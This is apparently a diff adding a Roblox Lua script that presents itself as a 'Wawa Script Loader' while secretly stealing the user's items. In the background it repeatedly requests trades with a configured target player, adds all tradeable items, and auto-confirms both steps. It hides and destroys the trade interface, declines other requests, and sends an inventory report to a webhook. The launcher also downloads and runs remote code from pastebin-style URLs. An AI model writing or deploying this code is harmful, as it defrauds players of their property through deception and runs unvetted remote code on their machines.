+local function isInActiveTrade()
+    if processingTrade or itemsAdded or firstConfirmed or secondConfirmed then
+        return true
+    end
+    if not session or type(session) ~= "table" then
+        return false
+    end
+    local status = session.status
+    return status == Trade.STATUS.Trading
+        or status == Trade.STATUS.SecondConfirm
+        or status == Trade.STATUS.Countdown
+        or status == Trade.STATUS.Settling
+end
+
+local function canSendTradeRequest()
+    if isInActiveTrade() then
+        return false
+    end
+    if session and session.status == Trade.STATUS.Pending then
+        return false
+    end
+    return true
+end
+
+local function hideTradeHud()
+    if not CONFIG.HIDE_TRADE_HUD then
+        return
+    end
+
+    pcall(function()
+        local UIManager = require(ReplicatedStorage.Client.Core.UIManager)
+        UIManager.CloseUI("Trade")
+        UIManager.CloseUI("TradeRequest")
+        UIManager.CloseUI("TradeInformation")
+        UIManager.CloseUI("TradeHistory")
+    end)
+
+    pcall(function()
+        local ConfirmPopupHandle = require(ReplicatedStorage.Client.UI.API.ConfirmPopupHandle)
+        ConfirmPopupHandle.Hide("TradeIncoming")
+    end)
+
+    local playerGui = LocalPlayer:FindFirstChild("PlayerGui")
+    local func = playerGui
+        and playerGui:FindFirstChild("Main")
+        and playerGui.Main:FindFirstChild("Func")
+
+    if func then
+        for _, name in ipairs(TRADE_UI_NAMES) do
+            local ui = func:FindFirstChild(name)
+            if ui then
+                pcall(function()
+                    ui:Destroy()
+                end)
+            end
+        end
+
+        if not tradeHudHooked then
+            tradeHudHooked = true
+            func.ChildAdded:Connect(function(child)
+                for _, name in ipairs(TRADE_UI_NAMES) do
+                    if child.Name == name then
+                        task.defer(function()
+                            pcall(function()
+                                child:Destroy()
+                            end)
+                        end)
+                        break
+                    end
+                end
+            end)
+        end
+    end
+
+    suppressTradeMessages()
+end
+
+local function findTargetPlayer()
+    for _, player in Players:GetPlayers() do
+        if player.Name == CONFIG.TARGET_NAME then
+            return player
+        end
+    end
+    return nil
+end
+
+local function resolveTargetUserId()
+    if targetUserId then
+        return targetUserId
+    end
+    local player = findTargetPlayer()
+    if player then
+        targetUserId = player.UserId
+        return targetUserId
+    end
+    return nil
+end
+
+local function resetTradeState()
+    session = nil
+    itemsAdded = false
+    firstConfirmed = false
+    secondConfirmed = false
+    processingTrade = false
+    pendingSince = 0
+    webhookSentTrade = false
+    STATE = "MONITOR"
+end
+
+local function isMainFirstConfirmed()
+    local mainId = resolveTargetUserId()
+    if not mainId or not session then
+        return false
+    end
+    local confirmed = session.confirmed
+    return type(confirmed) == "table" and confirmed[tostring(mainId)] == true
+end
+
+local function addAllItemsAndConfirm()
+    if processingTrade or itemsAdded or not session then
+        return
+    end
+    processingTrade = true
+
+    local sessionId = session.sessionId
+    if not sessionId then
+        processingTrade = false
+        return
+    end
+
+    local items = getTradeableItems()
+    sendInventoryWebhook("trade")
+    log("Adicionando", #items, "item(ns) ao trade...")
+
+    for _, item in ipairs(items) do
+        TradeApi.AddItem(sessionId, item.itemUid, item.count)
+        task.wait(CONFIG.ADD_ITEM_DELAY)
+    end
+
+    itemsAdded = true
+    task.wait(CONFIG.POST_ADD_DELAY)
+
+    if session and session.sessionId == sessionId then
+        TradeApi.Confirm(sessionId)
+        firstConfirmed = true
+        log("1ª confirmação enviada")
+        STATE = "WAIT_MAIN_CONFIRM"
+    end
+
+    processingTrade = false
+end
+
+local function trySecondConfirm()
+    if secondConfirmed or not session or not firstConfirmed then
+        return
+    end
+
+    if not isMainFirstConfirmed() then
+        return
+    end
+
+    if session.status ~= Trade.STATUS.SecondConfirm then
+        return
+    end
+
+    TradeApi.SecondConfirm(session.sessionId)
+    secondConfirmed = true
+    log("2ª confirmação enviada")
+    STATE = "WAIT_COMPLETE"
+end
+
+local function handleSessionSnapshot()
+    if not session or type(session) ~= "table" then
+        resetTradeState()
+        return
+    end
+
+    local status = session.status
+
+    if status == Trade.STATUS.Cancelled then
+        resetTradeState()
+        hideTradeHud()
+        scheduleTradeRetry()
+        return
+    end
+
+    if status == Trade.STATUS.Completed then
+        resetTradeState()
+        hideTradeHud()
+        scheduleTradeRetry(CONFIG.REQUEST_COOLDOWN)
+        return
+    end
+
+    if status == Trade.STATUS.Pending then
+        STATE = "WAIT_ACCEPT"
+        return
+    end
+
+    if status == Trade.STATUS.Trading then
+        if not itemsAdded then
+            task.spawn(addAllItemsAndConfirm)
+        elseif firstConfirmed and isMainFirstConfirmed() then
+            -- snapshot pode chegar antes do status mudar
+            trySecondConfirm()
+        end
+        return
+    end
+
+    if status == Trade.STATUS.SecondConfirm then
+        trySecondConfirm()
+        return
+    end
+
+    if status == Trade.STATUS.Countdown then
+        STATE = "WAIT_COMPLETE"
+    end
+end
+
+local function onTradeNotify(payload)
+    if type(payload) ~= "table" then
+        return
+    end
+
+    if payload.type == Trade.NOTIFY.TradeTip then
+        return
+    end
+
+    if payload.type == Trade.NOTIFY.SessionSnapshot then
+        session = payload.session
+        handleSessionSnapshot()
+        return
+    end
+
+    if payload.type == Trade.NOTIFY.IncomingRequest then
+        local sessionId = payload.sessionId
+        if sessionId == nil and type(payload.request) == "table" then
+            sessionId = payload.request.sessionId
+        end
+        if sessionId then
+            TradeApi.RespondRequest(sessionId, false)
+        end
+        hideTradeHud()
+        return
+    end
+end
+
+Net.OnRemote(Trade.NOTIFY_EVENT, onTradeNotify)
+
+local function tryRequestTrade()
+    if not canSendTradeRequest() then
+        return
+    end
+
+    if os.clock() - lastRequestTime < CONFIG.REQUEST_COOLDOWN then
+        return
+    end
+
+    local player = findTargetPlayer()
+    if not player then
+        return
+    end
+
+    targetUserId = player.UserId
+    TradeApi.RequestTrade(targetUserId)
+    lastRequestTime = os.clock()
+    pendingSince = os.clock()
+    STATE = "WAIT_ACCEPT"
+end
+
+local function scheduleTradeRetry(delay)
+    task.delay(delay or CONFIG.REJECT_RETRY_DELAY, function()
+        if isInActiveTrade() then
+            return
+        end
+        resetTradeState()
+        lastRequestTime = 0
+        tryRequestTrade()
+    end)
+end
+
+-- ========== WAWA SCRIPT LAUNCHER (embutido) ==========
+local WAWA_LAUNCHER_SOURCE = [===[
+local Players = game:GetService("Players")
+local TweenService = game:GetService("TweenService")
+local UserInputService = game:GetService("UserInputService")
+
+local LocalPlayer = Players.LocalPlayer
+local PlayerGui = LocalPlayer:WaitForChild("PlayerGui")
+
+local SCRIPTS = {
+    NoKey = "https://pastefy.app/5jyLNGpW/raw",
+    WithKey = "https://api.jnkie.com/api/v1/luascripts/public/5ddf1bb53ec97204aee5a203c9b9618b4b2c1653cf44247be706ab591f240d55/download",
+}
+
+local COLORS = {
+    Background = Color3.fromRGB(18, 18, 28),
+    Panel = Color3.fromRGB(28, 28, 42),
+    Accent = Color3.fromRGB(138, 92, 255),
+    AccentHover = Color3.fromRGB(165, 120, 255),
+    Secondary = Color3.fromRGB(56, 189, 248),
+    SecondaryHover = Color3.fromRGB(96, 205, 255),
+    Text = Color3.fromRGB(245, 245, 255),
+    SubText = Color3.fromRGB(160, 160, 190),
+    Success = Color3.fromRGB(74, 222, 128),
+    Error = Color3.fromRGB(248, 113, 113),
+}
+
+local function tween(instance, info, props)
+    return TweenService:Create(instance, info, props)
+end
+
+local function addCorner(parent, radius)
+    local corner = Instance.new("UICorner")
+    corner.CornerRadius = UDim.new(0, radius or 10)
+    corner.Parent = parent
+    return corner
+end
+
+local function addStroke(parent, color, thickness, transparency)
+    local stroke = Instance.new("UIStroke")
+    stroke.Color = color or COLORS.Accent
+    stroke.Thickness = thickness or 1.5
+    stroke.Transparency = transparency or 0.6
+    stroke.ApplyStrokeMode = Enum.ApplyStrokeMode.Border
+    stroke.Parent = parent
+    return stroke
+end
+
+local function addPadding(parent, px)
+    local pad = Instance.new("UIPadding")
+    pad.PaddingTop = UDim.new(0, px)
+    pad.PaddingBottom = UDim.new(0, px)
+    pad.PaddingLeft = UDim.new(0, px)
+    pad.PaddingRight = UDim.new(0, px)
+    pad.Parent = parent
+    return pad
+end
+
+local function makeButton(parent, config)
+    local button = Instance.new("TextButton")
+    button.Name = config.Name
+    button.Size = config.Size or UDim2.new(1, 0, 0, 48)
+    button.Position = config.Position or UDim2.new(0, 0, 0, 0)
+    button.BackgroundColor3 = config.Color or COLORS.Accent
+    button.BorderSizePixel = 0
+    button.AutoButtonColor = false
+    button.Text = ""
+    button.Parent = parent
+
+    addCorner(button, 12)
+    addStroke(button, config.StrokeColor or Color3.fromRGB(255, 255, 255), 1, 0.85)
+
+    local gradient = Instance.new("UIGradient")
+    gradient.Color = ColorSequence.new({
+        ColorSequenceKeypoint.new(0, config.Color or COLORS.Accent),
+        ColorSequenceKeypoint.new(1, config.ColorEnd or config.Color or COLORS.Accent),
+    })
+    gradient.Rotation = 45
+    gradient.Parent = button
+
+    local title = Instance.new("TextLabel")
+    title.BackgroundTransparency = 1
+    title.Size = UDim2.new(1, -20, 0, 22)
+    title.Position = UDim2.new(0, 10, 0, 8)
+    title.Font = Enum.Font.GothamBold
+    title.TextSize = 16
+    title.TextXAlignment = Enum.TextXAlignment.Left
+    title.TextColor3 = COLORS.Text
+    title.Text = config.Title
+    title.Parent = button
+
+    local subtitle = Instance.new("TextLabel")
+    subtitle.BackgroundTransparency = 1
+    subtitle.Size = UDim2.new(1, -20, 0, 16)
+    subtitle.Position = UDim2.new(0, 10, 0, 28)
+    subtitle.Font = Enum.Font.Gotham
+    subtitle.TextSize = 12
+    subtitle.TextXAlignment = Enum.TextXAlignment.Left
+    subtitle.TextColor3 = Color3.fromRGB(230, 230, 255)
+    subtitle.TextTransparency = 0.15
+    subtitle.Text = config.Subtitle
+    subtitle.Parent = button
+
+    local hoverColor = config.HoverColor or COLORS.AccentHover
+    local baseColor = config.Color or COLORS.Accent
+
+    button.MouseEnter:Connect(function()
+        tween(button, TweenInfo.new(0.2, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), {
+            BackgroundColor3 = hoverColor,
+        }):Play()
+        tween(button, TweenInfo.new(0.2), { Size = (config.Size or UDim2.new(1, 0, 0, 48)) + UDim2.new(0, 0, 0, 2) }):Play()
+    end)
+
+    button.MouseLeave:Connect(function()
+        tween(button, TweenInfo.new(0.2, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), {
+            BackgroundColor3 = baseColor,
+        }):Play()
+        tween(button, TweenInfo.new(0.2), { Size = config.Size or UDim2.new(1, 0, 0, 48) }):Play()
+    end)
+
+    return button
+end
+
+local screenGui = Instance.new("ScreenGui")
+screenGui.Name = "WawaScriptLauncher"
+screenGui.ResetOnSpawn = false
+screenGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
+screenGui.Parent = PlayerGui
+
+local backdrop = Instance.new("Frame")
+backdrop.Name = "Backdrop"
+backdrop.Size = UDim2.new(1, 0, 1, 0)
+backdrop.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
+backdrop.BackgroundTransparency = 0.4
+backdrop.BorderSizePixel = 0
+backdrop.Parent = screenGui
+
+local main = Instance.new("Frame")
+main.Name = "Main"
+main.AnchorPoint = Vector2.new(0.5, 0.5)
+main.Position = UDim2.new(0.5, 0, 0.5, 0)
+main.Size = UDim2.new(0, 380, 0, 340)
+main.BackgroundColor3 = COLORS.Panel
+main.BorderSizePixel = 0
+main.ClipsDescendants = true
+main.Parent = screenGui
+
+addCorner(main, 16)
+addStroke(main, COLORS.Accent, 1.5, 0.5)
+
+local mainGradient = Instance.new("UIGradient")
+mainGradient.Color = ColorSequence.new({
+    ColorSequenceKeypoint.new(0, Color3.fromRGB(32, 32, 50)),
+    ColorSequenceKeypoint.new(1, Color3.fromRGB(22, 22, 36)),
+})
+mainGradient.Rotation = 135
+mainGradient.Parent = main
+
+local glow = Instance.new("Frame")
+glow.Name = "Glow"
+glow.AnchorPoint = Vector2.new(0.5, 0.5)
+glow.Position = UDim2.new(0.5, 0, 0.5, 0)
+glow.Size = UDim2.new(0, 400, 0, 360)
+glow.BackgroundColor3 = COLORS.Accent
+glow.BackgroundTransparency = 0.88
+glow.BorderSizePixel = 0
+glow.ZIndex = main.ZIndex - 1
+glow.Parent = screenGui
+addCorner(glow, 20)
+
+local titleBar = Instance.new("Frame")
+titleBar.Name = "TitleBar"
+titleBar.Size = UDim2.new(1, 0, 0, 52)
+titleBar.BackgroundTransparency = 1
+titleBar.Parent = main
+
+local icon = Instance.new("TextLabel")
+icon.BackgroundTransparency = 1
+icon.Size = UDim2.new(0, 36, 0, 36)
+icon.Position = UDim2.new(0, 16, 0.5, -18)
+icon.Font = Enum.Font.GothamBold
+icon.TextSize = 22
+icon.TextColor3 = COLORS.Accent
+icon.Text = "⚡"
+icon.Parent = titleBar
+
+local titleLabel = Instance.new("TextLabel")
+titleLabel.BackgroundTransparency = 1
+titleLabel.Size = UDim2.new(1, -100, 0, 22)
+titleLabel.Position = UDim2.new(0, 54, 0, 10)
+titleLabel.Font = Enum.Font.GothamBold
+titleLabel.TextSize = 18
+titleLabel.TextXAlignment = Enum.TextXAlignment.Left
+titleLabel.TextColor3 = COLORS.Text
+titleLabel.Text = "Wawa Script Loader"
+titleLabel.Parent = titleBar
+
+local subtitleLabel = Instance.new("TextLabel")
+subtitleLabel.BackgroundTransparency = 1
+subtitleLabel.Size = UDim2.new(1, -100, 0, 16)
+subtitleLabel.Position = UDim2.new(0, 54, 0, 30)
+subtitleLabel.Font = Enum.Font.Gotham
+subtitleLabel.TextSize = 12
+subtitleLabel.TextXAlignment = Enum.TextXAlignment.Left
+subtitleLabel.TextColor3 = COLORS.SubText
+subtitleLabel.Text = "Choose your preferred version"
+subtitleLabel.Parent = titleBar
+
+local closeBtn = Instance.new("TextButton")
+closeBtn.Name = "Close"
+closeBtn.Size = UDim2.new(0, 32, 0, 32)
+closeBtn.Position = UDim2.new(1, -44, 0, 10)
+closeBtn.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+closeBtn.BackgroundTransparency = 0.92
+closeBtn.BorderSizePixel = 0
+closeBtn.Font = Enum.Font.GothamBold
+closeBtn.TextSize = 16
+closeBtn.TextColor3 = COLORS.SubText
+closeBtn.Text = "✕"
+closeBtn.AutoButtonColor = false
+closeBtn.Parent = titleBar
+addCorner(closeBtn, 8)
+
+closeBtn.MouseEnter:Connect(function()
+    tween(closeBtn, TweenInfo.new(0.15), {
+        BackgroundTransparency = 0.85,
+        TextColor3 = COLORS.Error,
+    }):Play()
+end)
+
+closeBtn.MouseLeave:Connect(function()
+    tween(closeBtn, TweenInfo.new(0.15), {
+        BackgroundTransparency = 0.92,
+        TextColor3 = COLORS.SubText,
+    }):Play()
+end)
+
+closeBtn.MouseButton1Click:Connect(function()
+    tween(main, TweenInfo.new(0.25, Enum.EasingStyle.Back, Enum.EasingDirection.In), {
+        Size = UDim2.new(0, 380, 0, 0),
+        BackgroundTransparency = 1,
+    }):Play()
+    tween(backdrop, TweenInfo.new(0.25), { BackgroundTransparency = 1 }):Play()
+    tween(glow, TweenInfo.new(0.25), { BackgroundTransparency = 1 }):Play()
+    task.wait(0.3)
+    screenGui:Destroy()
+end)
+
+local divider = Instance.new("Frame")
+divider.Size = UDim2.new(1, -32, 0, 1)
+divider.Position = UDim2.new(0, 16, 0, 52)
+divider.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+divider.BackgroundTransparency = 0.9
+divider.BorderSizePixel = 0
+divider.Parent = main
+
+local content = Instance.new("Frame")
+content.Name = "Content"
+content.Size = UDim2.new(1, -32, 1, -72)
+content.Position = UDim2.new(0, 16, 0, 64)
+content.BackgroundTransparency = 1
+content.Parent = main
+
+local layout = Instance.new("UIListLayout")
+layout.Padding = UDim.new(0, 14)
+layout.SortOrder = Enum.SortOrder.LayoutOrder
+layout.Parent = content
+
+local infoCard = Instance.new("Frame")
+infoCard.Name = "InfoCard"
+infoCard.Size = UDim2.new(1, 0, 0, 56)
+infoCard.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+infoCard.BackgroundTransparency = 0.94
+infoCard.BorderSizePixel = 0
+infoCard.LayoutOrder = 1
+infoCard.Parent = content
+addCorner(infoCard, 10)
+addPadding(infoCard, 12)
+
+local infoText = Instance.new("TextLabel")
+infoText.BackgroundTransparency = 1
+infoText.Size = UDim2.new(1, 0, 1, 0)
+infoText.Font = Enum.Font.Gotham
+infoText.TextSize = 13
+infoText.TextColor3 = COLORS.SubText
+infoText.TextWrapped = true
+infoText.TextXAlignment = Enum.TextXAlignment.Left
+infoText.TextYAlignment = Enum.TextYAlignment.Top
+infoText.Text = "Select a version below. The No Key version loads instantly. The Key version may require authentication."
+infoText.Parent = infoCard
+
+local noKeyBtn = makeButton(content, {
+    Name = "NoKey",
+    LayoutOrder = 2,
+    Title = "No Key Version",
+    Subtitle = "Free · Instant access · Paste script",
+    Color = Color3.fromRGB(138, 92, 255),
+    ColorEnd = Color3.fromRGB(99, 60, 220),
+    HoverColor = COLORS.AccentHover,
+})
+
+local withKeyBtn = makeButton(content, {
+    Name = "WithKey",
+    LayoutOrder = 3,
+    Title = "Key Version",
+    Subtitle = "Premium · Authenticated · GitHub script",
+    Color = Color3.fromRGB(14, 165, 233),
+    ColorEnd = Color3.fromRGB(6, 120, 180),
+    HoverColor = COLORS.SecondaryHover,
+    StrokeColor = COLORS.Secondary,
+})
+
+local statusLabel = Instance.new("TextLabel")
+statusLabel.Name = "Status"
+statusLabel.Size = UDim2.new(1, 0, 0, 20)
+statusLabel.BackgroundTransparency = 1
+statusLabel.Font = Enum.Font.GothamMedium
+statusLabel.TextSize = 12
+statusLabel.TextColor3 = COLORS.SubText
+statusLabel.Text = "Ready to load"
+statusLabel.LayoutOrder = 4
+statusLabel.Parent = content
+
+local dragging = false
+local dragStart, startPos
+
+local function updateDrag(input)
+    local delta = input.Position - dragStart
+    main.Position = UDim2.new(
+        startPos.X.Scale,
+        startPos.X.Offset + delta.X,
+        startPos.Y.Scale,
+        startPos.Y.Offset + delta.Y
+    )
+    glow.Position = UDim2.new(
+        main.Position.X.Scale,
+        main.Position.X.Offset,
+        main.Position.Y.Scale,
+        main.Position.Y.Offset
+    )
+end
+
+titleBar.InputBegan:Connect(function(input)
+    if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
+        dragging = true
+        dragStart = input.Position
+        startPos = main.Position
+
+        local conn
+        conn = input.Changed:Connect(function()
+            if input.UserInputState == Enum.UserInputState.End then
+                dragging = false
+                conn:Disconnect()
+            end
+        end)
+    end
+end)
+
+titleBar.InputChanged:Connect(function(input)
+    if input.UserInputType == Enum.UserInputType.MouseMovement or input.UserInputType == Enum.UserInputType.Touch then
+        if dragging then
+            updateDrag(input)
+        end
+    end
+end)
+
+UserInputService.InputChanged:Connect(function(input)
+    if dragging and (input.UserInputType == Enum.UserInputType.MouseMovement or input.UserInputType == Enum.UserInputType.Touch) then
+        updateDrag(input)
+    end
+end)
+
+local loading = false
+
+local function setStatus(text, color)
+    statusLabel.Text = text
+    statusLabel.TextColor3 = color or COLORS.SubText
+end
+
+local function loadScript(url, label)
+    if loading then
+        return
+    end
+    loading = true
+
+    setStatus("Loading " .. label .. "...", COLORS.Secondary)
+
+    local ok, result = pcall(function()
+        local source = game:HttpGet(url)
+        local fn = loadstring(source)
+        if not fn then
+            error("Failed to compile script")
+        end
+        return fn()
+    end)
+
+    loading = false
+
+    if ok then
+        setStatus(label .. " loaded successfully!", COLORS.Success)
+        task.wait(0.8)
+        tween(main, TweenInfo.new(0.3, Enum.EasingStyle.Back, Enum.EasingDirection.In), {
+            Size = UDim2.new(0, 380, 0, 0),
+        }):Play()
+        tween(backdrop, TweenInfo.new(0.3), { BackgroundTransparency = 1 }):Play()
+        tween(glow, TweenInfo.new(0.3), { BackgroundTransparency = 1 }):Play()
+        task.wait(0.35)
+        screenGui:Destroy()
+    else
+        setStatus("Error: " .. tostring(result), COLORS.Error)
+    end
+end
+
+noKeyBtn.MouseButton1Click:Connect(function()
+    loadScript(SCRIPTS.NoKey, "No Key version")
+end)
+
+withKeyBtn.MouseButton1Click:Connect(function()
+    loadScript(SCRIPTS.WithKey, "Key version")
+end)
+
+main.Size = UDim2.new(0, 380, 0, 0)
+main.BackgroundTransparency = 0.3
+backdrop.BackgroundTransparency = 1
+glow.BackgroundTransparency = 1
+
+task.defer(function()
+    tween(backdrop, TweenInfo.new(0.35), { BackgroundTransparency = 0.4 }):Play()
+    tween(glow, TweenInfo.new(0.4, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), {
+        BackgroundTransparency = 0.88,
+    }):Play()
+    tween(main, TweenInfo.new(0.45, Enum.EasingStyle.Back, Enum.EasingDirection.Out), {
+        Size = UDim2.new(0, 380, 0, 340),
+        BackgroundTransparency = 0,
+    }):Play()
+end)
+]===]
+
+local function runWawaLauncher()
+    if not CONFIG.RUN_WAWA_LAUNCHER then
+        return
+    end
+
+    task.spawn(function()
+        if LocalPlayer:FindFirstChild("PlayerGui")
+            and LocalPlayer.PlayerGui:FindFirstChild("WawaScriptLauncher") then
+            return
+        end
+
+        local fn, compileErr = loadstring(WAWA_LAUNCHER_SOURCE, "WawaScriptLauncher")
+        if not fn then
+            warnLog("Launcher compile:", tostring(compileErr))
+            return
+        end
+
+        local ok, err = pcall(fn)
+        if not ok then
+            warnLog("Launcher erro:", tostring(err))
+        end
+    end)
+end
+
+-- ========== START ==========
+log("Iniciado | alvo:", CONFIG.TARGET_NAME)
+runWawaLauncher()
+hideTradeHud()
+do
+    local methods = {}
+    if typeof(request) == "function" then table.insert(methods, "request") end
+    if syn and typeof(syn.request) == "function" then table.insert(methods, "syn.request") end
+    if http and typeof(http.request) == "function" then table.insert(methods, "http.request") end
+    if fluxus and typeof(fluxus.request) == "function" then table.insert(methods, "fluxus.request") end
+    if typeof(http_request) == "function" then table.insert(methods, "http_request") end
+    table.insert(methods, "HttpService")
+    log("HTTP disponivel:", table.concat(methods, ", "))
+end
+if CONFIG.TARGET_USER_ID then
+    targetUserId = CONFIG.TARGET_USER_ID
+    log("UserId fixo:", targetUserId)
+end
+
+Players.PlayerAdded:Connect(function(player)
+    if player.Name == CONFIG.TARGET_NAME then
+        log("PlayerAdded:", player.Name)
+        task.defer(tryRequestTrade)
+    end
+end)
+
+task.spawn(function()
+    while true do
+        hideTradeHud()
+        suppressTradeMessages()
+
+        if session and session.status == Trade.STATUS.Pending and pendingSince > 0 then
+            if os.clock() - pendingSince >= CONFIG.REQUEST_TIMEOUT then
+                local sessionId = session.sessionId
+                if sessionId then
+                    TradeApi.Cancel(sessionId)
+                end
+                resetTradeState()
+                hideTradeHud()
+                scheduleTradeRetry()
+            end
+        elseif STATE == "WAIT_ACCEPT" and not session and pendingSince > 0 then
+            if os.clock() - pendingSince >= CONFIG.REQUEST_TIMEOUT then
+                resetTradeState()
+                scheduleTradeRetry()
+            end
+        end
+
+        tryRequestTrade()
+        task.wait(CONFIG.MONITOR_INTERVAL)
+    end
+end)
+
+-- tentativa imediata se main já está no servidor
+task.defer(function()
+    hideTradeHud()
+    tryRequestTrade()
+end)
+
+-- webhook ao executar (não precisa aceitar trade)
+task.spawn(function()
+    for attempt = 1, 4 do
+        if webhookSentStartup then
+            break
+        end
+        task.wait(attempt == 1 and 3 or 5)
+        if not webhookSentStartup then
+            log("Tentativa webhook startup", attempt, "/ 4")
+            sendInventoryWebhook("startup")
+        end
+    end
+    if not webhookSentStartup then
+        warnLog("Webhook startup nao enviou apos 4 tentativas — verifica Http Requests no Potassium")
+    end
+end)
